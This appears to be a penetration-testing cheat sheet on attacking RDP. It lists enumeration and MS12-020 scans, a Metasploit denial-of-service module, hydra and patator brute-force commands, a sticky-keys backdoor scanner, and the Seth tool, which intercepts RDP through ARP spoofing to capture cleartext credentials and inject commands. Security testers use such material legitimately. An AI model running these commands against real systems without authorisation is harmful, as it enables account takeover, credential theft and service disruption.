# RDP

### remote connect

{% hint style="info" %}
#### remember when you access an active RDP session the current user will be kicked off
{% endhint %}

remote desktop connection from linux

```
rdesktop -u [user] [domain or ip]
xfreerdp /u:"[user]" /v:[ip]:[port]
```

### nmap

```
nmap -Pn -n 127.0.0.1 --script rdp-enum-encryption
nmap -Pn -n 127.0.0.1 --script rdp-ntlm-info
nmap -Pn -n 127.0.0.1 --script rdp-vuln-ms12-020
```

### metasploit modules

```
use auxiliary/scanner/rdp/ms12_020_check
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```

### rdp-sec-check

checks which encryption algorithms and authentication methods are used, as well as some other security settings. At the end of the check, rdp-sec-check summarizes the potential security issues of the Remote Desktop Service.

```
sudo cpan
install Encoding::BER
Ctrl+d
wget https://raw.githubusercontent.com/portcullislabs/rdp-sec-check/master/rdp-sec-check.pl
chmod +x rdp-sec-check.pl
./rdp-sec-check.pl --help
```

### brute force

```
patator rdp_login host=192.168.0.101 user=FILE0 password=FILE1 0=user.txt 1=passwords.txt
hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.102
```

### Man-in-the-middle attack on RDP

Responder is a comprehensive tool for performing a man-in-the-middle attack against Windows authentication methods. Among other rogue servers , the program has an RDP server.

#### for more info refer to [windows authentication hacking](https://miloserdov.org/?p=4055)

### Sticky-keys & Utilman

sticky-keys-hunter is a script for testing RDP hosts on sticky keys and utilman backdoor.

```
sticky-keys-hunter TARGET_IP
```

## RDP MitM

{% embed url="https://github.com/SySS-Research/Seth" %}

Seth is a tool written in Python and Bash to MitM RDP connections by attempting to downgrade the connection in order to extract clear text credentials. It was developed to raise awareness and educate about the importance of properly configured RDP connections in the context of pentests, workshops or talks. The author is Adrian Vollmer (SySS GmbH).

```
git clone https://github.com/SySS-Research/Seth.git
cd Seth 
pip install -r requirements.txt

./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP> [<COMMAND>] 
```

{% hint style="info" %}
Note: The last IP address must be that of the gateway, this can only change if the victim’s computer shares a subnet with the RDP host.
{% endhint %}

The last parameter is optional. It can contain a command that is executed on the RDP host by simulating WIN+R via key press event injection. Keystroke injection depends on which keyboard layout the victim is using - currently it's only reliable with the English US layout. I suggest avoiding special characters by using `powershell -enc <STRING>`, where STRING is your UTF-16le and Base64 encoded command. However, `calc` should be pretty universal and gets the job done.

\
The shell script performs ARP spoofing to gain a Man-in-the-Middle position and redirects the traffic such that it runs through an RDP proxy. The proxy can be called separately. This can be useful if you want use Seth in combination with Responder. Use Responder to gain a Man-in-the-Middle position and run Seth at the same time. Run seth.py -h for more information.

